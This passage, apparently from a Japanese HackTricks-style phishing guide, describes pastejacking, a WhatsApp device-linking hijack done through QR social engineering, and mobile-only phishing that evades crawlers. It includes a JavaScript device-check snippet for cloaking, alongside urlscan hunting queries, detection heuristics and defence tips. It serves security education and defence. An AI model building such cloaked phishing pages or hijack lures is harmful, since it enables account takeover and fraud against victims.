AzureAD/AWS/Okta のイベントを監視し、**`deleteMFA` + `addMFA`** が同じ IP から数分以内に発生していないか確認します。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された Web ページや typosquatting された Web ページから、悪意のあるコマンドを被害者のクリップボードに気付かれずにコピーし、**Win + R**、**Win + X**、またはターミナルウィンドウに貼り付けるようユーザーを誘導できます。これにより、ダウンロードや添付ファイルを使わずに任意のコードが実行されます。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* おとりページ（例：偽の省庁/CERT「チャンネル」）に WhatsApp Web/Desktop の QR コードを表示し、被害者にスキャンするよう指示します。これにより、攻撃者が気付かれずに**リンク済みデバイス**として追加されます。<sup>[[12]](#references)</sup>
* 攻撃者は、セッションが削除されるまで、直ちにチャットや連絡先を閲覧できるようになります。被害者には後から「新しいデバイスがリンクされました」という通知が表示される場合があります。防御側は、信頼できない QR ページへのアクセス直後に発生した不審なデバイスリンクイベントを調査できます。

### モバイル端末を条件とするフィッシングで crawler/sandbox を回避
攻撃者は、デスクトップの crawler が最終ページに到達できないよう、簡単なデバイスチェックをフィッシングフローに組み込むことが増えています。よくある手法は、タッチ操作に対応した DOM かどうかを確認し、その結果をサーバーエンドポイントに送信する小さなスクリプトです。モバイル以外のクライアントには HTTP 500（または空白ページ）が返され、モバイルユーザーにはフロー全体が表示されます。<sup>[[7]](#references)</sup>

最小限のクライアント側スニペット（一般的なロジック）:

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` のロジック（簡略版）：

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

観測されることの多いサーバーの挙動:
- 初回読み込み時にセッション cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` の場合、後続の GET に対して 500（またはプレースホルダー）を返し、`true` の場合のみフィッシングページを表示する。

ハンティングと検出のヒューリスティック:
- urlscan のクエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → HTTP 500（非モバイルの場合）というシーケンス。正規のモバイル被害者の経路では、200 と後続の HTML/JS が返される。
- `ontouchstart` などのデバイスチェックだけを条件にコンテンツを表示するページをブロックするか、詳しく調査する。

防御のヒント:
- モバイルに似たフィンガープリントを設定し、JS を有効にしてクローラーを実行し、制限されたコンテンツを明らかにする。
- 新規登録ドメインで `POST /detect` に続いて不審な 500 応答が発生した場合にアラートを出す。

## References

- [1] [フィッシングで使用されるドメインのバリエーション生成 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [フィッシングの発見: ツールと手法 (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC を使った認証情報の窃取と 2FA の回避 (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC によるセッションの窃取と 2FA の回避 (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy での Postfix の DKIM インストールと設定方法 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 グローバルインシデント対応レポート — ソーシャルエンジニアリング編](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing — モバイル制限型フィッシングインフラとヒューリスティック (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [ランタイムアセンブリ攻撃の次なるフロンティア: LLM を活用したリアルタイムでのフィッシング JavaScript 生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [なりすまし、クリックハイジャック、TDS: マルウェア配布エコシステムの内幕](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com のビットスクワッティング (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [ビット反転による Microsoft の windows.com へのトラフィックの乗っ取り (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [本当に恋愛アプリ? パキスタンを狙ったスパイウェアキャンペーンで偽の出会い系アプリがルアーとして使用される](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat の IoC とサンプル](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
